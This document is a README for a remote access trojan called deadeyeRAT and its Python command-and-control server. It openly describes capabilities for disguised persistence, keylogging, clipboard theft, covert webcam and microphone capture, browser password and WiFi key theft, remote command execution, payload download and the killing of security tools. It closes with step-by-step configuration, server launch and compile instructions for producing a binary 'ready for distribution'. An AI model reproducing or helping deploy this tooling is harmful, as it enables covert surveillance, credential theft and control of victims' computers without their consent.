# deadeyeRAT v1.0 - Remote Access Trojan & Python C2 Infrastructure

Welcome to `deadeyeRAT`, a lightweight, highly functional Remote Access Trojan (RAT) engineered for stealth deployment and full runtime control over target Windows environments. The framework utilizes a native C++ client binary paired with an assembly migration stub and a multi-threaded Python 3 Command and Control (C2) server.

## 🎯 Primary Capabilities

### 1. Persistence & Stealth Execution
* **Registry Hijacking:** The payload moves its executable directly into the victim's hidden user environment (`%APPDATA%`) and maps a key into the `Software\Microsoft\Windows\CurrentVersion\Run` hive under the fake process name `WindowsUpdater.exe`.
* **Low-Profile Entry:** Integrates an assembly module (`c++.asm`) to dynamic-link runtime APIs, reducing the compilation footprint and confusing basic security scanners.
* **Mutant Locking:** Employs a unique hardcoded system Mutex (`WindowsUpdateMutex`) to prevent duplicate instances from running simultaneously on the target.

### 2. Live Surveillance Suite
* **Hidden Keylogger:** Runs silently on a separate worker thread using window polling mechanics to capture alphanumeric keyboard input, dumping records straight back to the C2 panel.
* **Clipboard Sniffing:** Hooks the OS clipboard every 1000ms to instantly steal copied strings, text logs, passwords, or transaction data.
* **Media Hijacking:** Captures continuous desktop screenshots via GDI graphics buffers, fires hidden PowerShell webcam capture macros, and initializes remote audio recording through local microphone streams.

### 3. Credential Harvesting & System Control
* **Password Cracking:** Automation routines built to parse native browser directories, scraping offline application storage databases for saved account credentials and stored WiFi network profile passwords.
* **Network & Process Control:** Full remote process injection capabilities allowing operators to query running software lists, forcefully kill tasks, download raw remote binaries via URL, or execute command shell arguments.

---

## 💻 Operator Interface & C2 Console

The management script (`c2.py`) builds an interactive command-line dashboard allowing one operator to maintain, control, and communicate with all active incoming connections.

### Main Control Commands
* `list`: Renders a clean grid displaying all active systems, logging their assigned ID, public external IP, date of initial infection, and last active heartbeat status.
* `select <client_id>`: Contextually locks the operator terminal onto one specific targeted system to run focused commands.
* `broadcast <command>`: Pushes an automated command string across every single machine connected to the botnet simultaneously.
* `exit`: Safely drops connections and shuts down the listening server socket.

### Compromised Host Commands
Once a specific device session is loaded, the operator has access to the following instruction set:

| Command | Action | Payload Output |
| :--- | :--- | :--- |
| `SYSINFO` | Scrapes hardware properties, OS version, RAM capacity, and drive storage space. | Text Sheet |
| `NETINFO` | Maps hostnames, localized IP addresses, network interface adapters, and physical MAC addresses. | Text Sheet |
| `SCREENSHOT` | Takes a live background capture of the current active monitor display. | `.bmp` Image |
| `WEBCAM` | Forces webcam video capture without lighting up standard camera indicators. | `.jpg` Image |
| `MIC <sec>` | Activates the local microphone array to record audio for a set duration. | `.wav` Audio |
| `PASSWORDS` | Commands the target client to extract and parse saved browser credentials. | Decrypted Log |
| `WIFI` | Extracts clean text data for all previously saved wireless network security keys. | Decrypted Log |
| `EXEC <cmd>` | Executes a silent, hidden console command natively on the target background. | Success / Fail |
| `DOWNLOAD` | Instructs the host to download a secondary payload from a web link onto the drive. | Success / Fail |
| `KILL <pid>` | Terminates a running system process ID (useful for stopping security tools). | Success / Fail |
| `EXIT` | Wipes the active execution process, forcing the target client to terminate completely. | Connection Drop |

---

## 🛠️ Deployment & Build Guide

### Step 1: Configure the Infrastructure
Before compiling the client, you must configure your network listening target details inside the `config.json` text block:

```json
{
  "serverIP": "127.0.0.1",
  "serverPort": 8888,
  "installPath": "%APPDATA%\\WindowsUpdater.exe",
  "startupName": "WindowsUpdater",
  "mutexName": "WindowsUpdateMutex",
  "connectionInterval": 30,
  "maxRetries": 10,
  "keyloggerEnabled": true,
  "clipboardEnabled": true,
  "encryptionKey": "RAT_KEY_2023_SECURE"
}
```
*Note: Make sure the `encryptionKey` matches the string variable defined inside the server code exactly, or the symmetric XOR network stream decipher will corrupt communications.*

### Step 2: Initialize the Control Server
Launch the master socket listener on an operational server or virtual environment:
```bash
python3 c2.py
```
The console will start monitoring port `8888` for incoming TCP connection handshakes.

### Step 3: Compile the Payload
To package the C++ client source file (`RAT.cpp`) alongside the low-level assembly code hooks (`c++.asm`), compile the release payload via the developer command prompt using an optimization flag to strip debug headers:

```bash
cl.exe /O2 /MT RAT.cpp /link /SUBSYSTEM:WINDOWS ws2_32.lib wininet.lib urlmon.lib user32.lib gdi32.lib
```
This compilation outputs a final executable binary ready for distribution. Once launched on a machine, it will attempt to silently connect back to the operational panel.
